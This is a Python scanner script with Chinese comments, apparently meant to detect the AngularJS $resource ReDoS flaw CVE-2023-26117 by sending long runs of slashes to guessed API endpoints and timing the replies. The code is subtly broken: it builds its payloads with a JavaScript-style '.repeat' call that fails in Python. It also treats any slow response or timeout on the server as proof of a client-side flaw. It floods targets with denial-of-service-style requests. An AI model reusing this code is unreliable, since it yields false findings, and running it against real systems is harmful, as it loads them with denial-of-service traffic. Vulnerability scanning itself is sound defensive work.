"""
CVE-2023-26117 Vulnerability Detection Script
AngularJS $resource Service ReDoS - CVSS 5.3 (Medium)
HeroDevs Vulnerability Directory - 最佳驗證路徑
影響版本: AngularJS ≥ 1.0.0
"""

import requests
import time
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2023-26117 弱點
    AngularJS $resource 服務 ReDoS 攻擊
    最佳驗證路徑：測試大量斜線導致的 URL 解析災難性回溯
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2023-26117: AngularJS $resource 服務 ReDoS 弱點，大量斜線在 URL 解析時導致正規表達式災難性回溯',
        'remediation': '更新到 AngularJS NES 1.9.1 或 1.5.17，限制 $resource URL 路徑長度和深度，實施 URL 格式預驗證'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2023-26117 $resource ReDoS 弱點...")
        
        # Step 1: 檢測 AngularJS 和 $resource 服務使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'angular.module'
        ]
        
        resource_indicators = [
            '$resource',
            'ngResource',
            'angular-resource',
            '.resource(',
            '$resource(',
            'Resource(',
            'restangular',
            'resource service'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_resource = any(indicator in response.text for indicator in resource_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        print(f"      [檢測] 發現 AngularJS 應用程式，$resource 檢測: {'是' if uses_resource else '否'}")
        
        # Step 2: 檢查 $resource 相關的 JavaScript 代碼
        resource_usage_patterns = [
            r'\$resource\s*\(\s*["\'][^"\']+["\']',
            r'angular\.module\([^)]+\)\.factory\([^)]*resource',
            r'ngResource["\']?\s*as\s+dependency',
            r'Resource\s*\.\s*query\s*\(',
            r'Resource\s*\.\s*get\s*\(',
            r'\.resource\s*\(\s*["\'][^"\']*["\']'
        ]
        
        found_resource_usage = []
        for pattern in resource_usage_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_resource_usage.extend(matches)
        
        if found_resource_usage:
            print(f"      [檢測] 發現 {len(found_resource_usage)} 個 $resource 使用實例")
            uses_resource = True
        
        # Step 3: 構造 CVE-2023-26117 特定 ReDoS 攻擊負載
        # 基於 HeroDevs 分析：大量斜線導致 URL 解析回溯
        resource_redos_payloads = [
            {
                'payload': '/api/endpoint' + '/'.repeat(1000) + 'resource',
                'description': '1000 consecutive slashes ReDoS',
                'expected_delay': 1.0,
                'severity': 'medium'
            },
            {
                'payload': '/api/data' + '/'.repeat(2000) + 'item',
                'description': '2000 slashes massive ReDoS',
                'expected_delay': 3.0,
                'severity': 'high'
            },
            {
                'payload': '/resource' + '/'.repeat(500) + 'nested' + '/'.repeat(500) + 'endpoint',
                'description': 'Multiple slash groups pattern',
                'expected_delay': 2.0,
                'severity': 'high'
            },
            {
                'payload': '/api' + '/'.repeat(800) + 'v1' + '/'.repeat(800) + 'users',
                'description': 'API versioning slash ReDoS',
                'expected_delay': 1.8,
                'severity': 'medium'
            },
            {
                'payload': '/service' + '/'.repeat(1500) + 'method',
                'description': 'Service method path ReDoS',
                'expected_delay': 2.5,
                'severity': 'high'
            }
        ]
        
        # Step 4: 測試 API 端點的 $resource URL 處理
        resource_endpoints = [
            '/api/resource',
            '/api/service',
            '/api/endpoint',
            '/api/data',
            '/api/rest',
            '/resource',
            '/service',
            '/rest',
            '/api/v1',
            '/api/v2'
        ]
        
        general_endpoints = [
            '/api/user',
            '/api/config',
            '/api/settings',
            '/api/query',
            '/api/fetch'
        ]
        
        all_endpoints = resource_endpoints + general_endpoints
        
        print(f"      [檢測] 開始測試 {len(resource_redos_payloads)} 個 $resource ReDoS 負載...")
        
        for endpoint in all_endpoints:
            try:
                # 檢查端點可用性
                test_response = session.get(urljoin(target_url, endpoint), timeout=10)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in resource_redos_payloads:
                    malicious_url = payload_data['payload']
                    description = payload_data['description']
                    expected_delay = payload_data['expected_delay']
                    severity = payload_data['severity']
                    
                    try:
                        # 測試 $resource URL 相關參數
                        test_data = {
                            'resource_url': malicious_url,
                            'api_path': malicious_url,
                            'endpoint': malicious_url,
                            'service_url': malicious_url,
                            'rest_url': malicious_url,
                            'path': malicious_url,
                            'url': malicious_url
                        }
                        
                        print(f"      [檢測] 執行 {description}...")
                        
                        # 執行請求並測量處理時間
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=test_data,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        print(f"      [檢測] $resource URL 處理耗時: {duration:.2f} 秒")
                        
                        # 判斷是否存在 ReDoS
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 CVE-2023-26117 $resource ReDoS 弱點！\n\n攻擊詳情:\n- 負載: {description}\n- URL 路徑: {len(malicious_url)} 字符 ({malicious_url.count('/')} 個斜線)\n- 處理時間: {duration:.2f} 秒 (預期: {expected_delay:.1f}秒)\n- 嚴重程度: {severity}\n\n這證明了 AngularJS $resource 服務在解析包含大量斜線的 URL 時發生災難性回溯，攻擊者可利用此弱點造成服務拒絕。"
                            return result
                        
                        # 檢查是否返回錯誤但耗時過長
                        if response.status_code >= 400 and duration > 0.8:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 $resource URL 解析效能問題。{description} 導致錯誤回應但耗時 {duration:.2f} 秒，表明存在 URL 解析回溯問題。"
                            return result
                        
                        # 測試 JSON 格式的 $resource 設定
                        json_data = {
                            'resource': {
                                'url': malicious_url,
                                'method': 'GET'
                            },
                            'config': {
                                'apiUrl': malicious_url
                            },
                            'service': {
                                'endpoint': malicious_url
                            }
                        }
                        
                        headers = {'Content-Type': 'application/json'}
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=json_data,
                            headers=headers,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 $resource ReDoS 弱點 (JSON 設定)。{description} 耗時 {duration:.2f} 秒。"
                            return result
                        
                        # 測試 GET 參數的 URL 路徑
                        get_params = {
                            'path': malicious_url,
                            'resource_path': malicious_url,
                            'api_path': malicious_url
                        }
                        
                        start_time = time.time()
                        
                        response = session.get(
                            urljoin(target_url, endpoint),
                            params=get_params,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 $resource ReDoS 弱點 (GET 參數)。{description} 耗時 {duration:.2f} 秒。"
                            return result
                            
                    except requests.exceptions.Timeout:
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現嚴重的 CVE-2023-26117 $resource ReDoS 弱點！{description} 導致請求逾時 (>30秒)，證明發生了災難性回溯。URL 斜線數量: {malicious_url.count('/')}。這是高風險弱點，可導致應用程式無響應。"
                        return result
                    
                    except Exception as e:
                        if "timeout" in str(e).lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 $resource ReDoS 弱點。{description} 導致連線逾時。"
                            return result
                        continue
                        
            except Exception as e:
                continue
        
        # Step 5: 分析現有的 $resource 實作
        print("      [檢測] 分析現有的 $resource 服務實作...")
        
        if found_resource_usage:
            # 檢查 $resource 的 URL 模式
            url_patterns_in_code = []
            for usage in found_resource_usage:
                # 提取 URL 模式
                url_match = re.search(r'["\']([^"\']*\/[^"\']*)["\']', usage)
                if url_match:
                    url_patterns_in_code.append(url_match.group(1))
            
            if url_patterns_in_code:
                print(f"      [檢測] 發現 {len(url_patterns_in_code)} 個 $resource URL 模式")
                
                # 檢查是否有動態 URL 構建
                dynamic_patterns = []
                for pattern in url_patterns_in_code:
                    if ':' in pattern or '{' in pattern or '+' in pattern:
                        dynamic_patterns.append(pattern)
                
                if dynamic_patterns:
                    print(f"      [檢測] 發現 {len(dynamic_patterns)} 個動態 URL 模式，可能存在注入風險")
        
        # Step 6: 測試特定的 $resource 方法調用
        print("      [檢測] 測試 $resource 方法調用...")
        
        resource_methods = ['query', 'get', 'save', 'remove', 'delete']
        
        for method in resource_methods:
            for endpoint in ['/api/test', '/test']:
                try:
                    # 構造 $resource 方法調用測試
                    method_payload = '/api' + '/'.repeat(600) + method
                    
                    test_data = {
                        'method': method,
                        'resource_method': method,
                        'action': method,
                        'path': method_payload
                    }
                    
                    start_time = time.time()
                    
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data=test_data,
                        timeout=20
                    )
                    
                    end_time = time.time()
                    duration = end_time - start_time
                    
                    if duration > 1.0:
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現 $resource 方法 ReDoS。{method} 方法處理耗時 {duration:.2f} 秒。"
                        return result
                        
                except requests.exceptions.Timeout:
                    result['vulnerable'] = True
                    result['evidence'] = f"$resource {method} 方法調用導致逾時，存在 ReDoS 風險。"
                    return result
                except:
                    continue
        
        # Step 7: 檢查 Angular-Resource 相關的 JavaScript 檔案
        js_file_patterns = [
            r'angular-resource[^"\']*\.js',
            r'ngResource[^"\']*\.js',
            r'resource[^"\']*\.min\.js'
        ]
        
        found_resource_files = []
        for pattern in js_file_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_resource_files.extend(matches)
        
        if found_resource_files:
            print(f"      [檢測] 發現 {len(found_resource_files)} 個 angular-resource 相關檔案")
            
            # 嘗試檢查這些檔案的版本
            for js_file in found_resource_files:
                try:
                    js_response = session.get(urljoin(target_url, js_file), timeout=10)
                    if js_response.status_code == 200:
                        version_match = re.search(r'version["\']?\s*:\s*["\']([0-9.]+)', js_response.text)
                        if version_match:
                            version = version_match.group(1)
                            print(f"      [檢測] 檢測到 angular-resource 版本: {version}")
                except:
                    continue
        
        # Step 8: 執行輕量級路徑深度測試
        print("      [檢測] 執行輕量級路徑深度測試...")
        
        lightweight_payloads = [
            '/api' + '/'.repeat(100) + 'test',
            '/service' + '/'.repeat(150) + 'method',
            '/resource' + '/'.repeat(200) + 'action'
        ]
        
        for payload in lightweight_payloads:
            for endpoint in ['/api/test', '/test', '/api/resource']:
                try:
                    start_time = time.time()
                    
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data={'path': payload, 'url': payload},
                        timeout=10
                    )
                    
                    end_time = time.time()
                    duration = end_time - start_time
                    
                    if duration > 0.3:  # 300ms 閾值
                        print(f"      [檢測] 在 {endpoint} 檢測到路徑處理延遲 ({duration:.2f}s)")
                        if uses_resource:
                            result['evidence'] += f" 輕量級測試顯示 $resource 路徑處理存在效能問題。"
                            
                except:
                    continue
        
        # Step 9: 檢查 REST API 模式
        rest_patterns = [
            r'\/api\/[^\/]+\/:id',
            r'\/api\/v\d+\/[^\/]+',
            r'\/resource\/:resourceId',
            r'\/[^\/]+\/:id\/[^\/]+'
        ]
        
        found_rest_patterns = []
        for pattern in rest_patterns:
            if re.search(pattern, response.text):
                found_rest_patterns.append(pattern)
        
        if found_rest_patterns:
            print(f"      [檢測] 發現 {len(found_rest_patterns)} 個 REST API 模式")
        
        # 最終結果
        if uses_resource and found_resource_usage:
            result['evidence'] = f"檢測摘要: 發現 AngularJS $resource 服務使用，包含 {len(found_resource_usage)} 個實例。測試了 {len(all_endpoints)} 個端點和 {len(resource_redos_payloads)} 個 ReDoS 負載。雖未觸發明確攻擊，但建議檢查 $resource URL 參數處理並更新到安全版本。"
        elif uses_resource:
            result['evidence'] = f"檢測到 $resource 服務使用跡象，但未發現明確的 ReDoS 弱點。建議審查 $resource 實作並考慮更新版本。"
        else:
            result['evidence'] = f"完成 CVE-2023-26117 檢測。未明確檢測到 $resource 服務使用，測試了 {len(all_endpoints)} 個端點，未發現相關 ReDoS 弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result